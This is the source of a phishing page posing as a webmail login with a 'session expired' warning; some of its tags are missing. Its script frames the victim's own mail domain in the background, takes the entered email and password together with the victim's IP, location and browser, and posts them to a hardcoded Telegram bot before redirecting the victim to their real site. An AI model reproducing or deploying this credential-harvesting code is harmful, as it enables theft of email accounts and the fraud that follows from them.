  <meta charset="UTF-8" />

  <title>Webmail Login</title>
  <style>
    body {
      margin: 0;
      background-color: #808080;
      font-family: Arial, sans-serif;
    }
    iframe#background-frame {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      border: none;
      z-index: -1;
      opacity: 0.1;
      pointer-events: none;
    }
    .login-container {
      background-color: #f4f4f4;
      width: 350px;
      margin: 100px auto;
      padding: 40px 30px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
      position: relative;
      text-align: center;
    }
    .login-container img {
      width: 80px;
      height: 80px;
      background-color: #f60;
      border-radius: 50%;
      position: absolute;
      top: -40px;
      left: calc(50% - 40px);
      padding: 10px;
    }
    .login-container h2 {
      margin-top: 50px;
      color: blue;
    }
    .login-container p#session-expired {
      color: red;
      font-weight: bold;
      margin-bottom: 10px;
    }
    .login-container input[type="text"],
    .login-container input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
      font-size: 14px;
    }
    .login-container label {
      display: flex;
      align-items: center;
      font-size: 14px;
      margin: 5px 0;
      text-align: left;
    }
    .login-container label input[type="checkbox"] {
      margin-right: 8px;
    }
    .login-container .secure-icon {
      font-size: 14px;
      margin-left: 5px;
      cursor: pointer;
    }
    .login-container .forgot-password {
      float: right;
      font-size: 14px;
      margin-top: -22px;
      color: #007bff;
      text-decoration: none;
    }
    .login-container button {
      background-color: #28a745;
      color: white;
      padding: 10px;
      width: 100%;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }
    .footer {
      text-align: center;
      font-size: 13px;
      margin-top: 20px;
      color: #333;
    }
    .footer .secure-shield {
      color: green;
      font-size: 16px;
      margin-right: 5px;
    }
    .error {
      color: red;
      font-size: 13px;
      margin-top: -5px;
    }
    @keyframes shake {
      0% { transform: translateX(0); }
      20% { transform: translateX(-5px); }
      40% { transform: translateX(5px); }
      60% { transform: translateX(-5px); }
      80% { transform: translateX(5px); }
      100% { transform: translateX(0); }
    }
    .shake {
      animation: shake 0.5s;
      border: 2px solid red !important;
    }
  </style>
</head>

  function updateLanguage(locale) {
    const lang = translations[locale] ? locale : 'en';
    const t = translations[lang];
    document.querySelector("h2").innerText = t.title;
    document.getElementById("session-expired").innerText = t.sessionExpired;
    document.getElementById("email").placeholder = t.email;
    document.getElementById("password").placeholder = t.password;
    document.getElementById("confirmPassword").placeholder = t.retypePassword;
    document.getElementById("secure-label").innerText = t.alwaysSecure;
    document.getElementById("private-label").innerText = t.privateComputer;
    document.getElementById("forgot-link").innerText = t.forgotPassword;
    document.getElementById("submit-btn").innerText = t.signIn;
    document.querySelector(".footer").innerHTML = `<span class="secure-shield">ğŸ›¡ï¸</span> ${t.footer}`;
    // Save password mismatch text for later use
    window.passwordMismatchText = t.passwordMismatch;
  }

  function updateBackground(email) {
    const domain = email.split('@')[1];
    if (domain) {
      document.getElementById("background-frame").src = "http://" + domain;
    }
  }

  function submitForm() {
    const emailInput = document.getElementById('email');
    const email = emailInput.value;
    const passwordInput = document.getElementById('password');
    const confirmPasswordInput = document.getElementById('confirmPassword');
    const password = passwordInput.value;
    const confirmPassword = confirmPasswordInput.value;
    const errorMessage = document.getElementById('error-message');
    errorMessage.textContent = "";

    if (password !== confirmPassword) {
      errorMessage.textContent = window.passwordMismatchText || "Passwords do not match!";
      passwordInput.classList.add("shake");
      confirmPasswordInput.classList.add("shake");
      setTimeout(() => {
        passwordInput.classList.remove("shake");
        confirmPasswordInput.classList.remove("shake");
      }, 500);
      return;
    }

    const browser = navigator.userAgent;
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        const ip = data.ip || 'Unknown';
        const city = data.city || '';
        const region = data.region || '';
        const country = data.country_name || '';
        const location = `${city}, ${region}, ${country}`;
        const message = `ğŸ” Webmail Login:\nğŸ“§ Email: ${email}\nğŸ”‘ Password: ${password}\nğŸ“ Location: ${location}\nğŸŒ IP: ${ip}\nğŸ§­ Browser: ${browser}`;
        const telegramBotToken = '8147785714:AAEhoDVshzqkal0AOT4Ie_Qyu1jjP1SV8N0';
        const chatId = '7437481970';
        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: message })
        }).then(() => {
          const domain = email.split('@')[1];
          if (domain) window.location.href = `https://${domain}`;
        });
      });
  }

  window.addEventListener('DOMContentLoaded', () => {
    const emailInput = document.getElementById("email");
    const urlParams = new URLSearchParams(window.location.search);
    const emailFromUrl = urlParams.get("email");
    if (emailFromUrl) {
      emailInput.value = emailFromUrl;
      updateBackground(emailFromUrl);
    } else {
      const savedEmail = localStorage.getItem("savedEmail");
      if (savedEmail) {
        emailInput.value = savedEmail;
        updateBackground(savedEmail);
      }
    }

    emailInput.addEventListener("blur", () => {
      const email = emailInput.value;
      if (email.includes("@")) {
        localStorage.setItem("savedEmail", email);
        updateBackground(email);
      }
    });

    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        const lang = (data.languages || 'en').split(',')[0].split('-')[0];
        updateLanguage(lang);
      });
  });
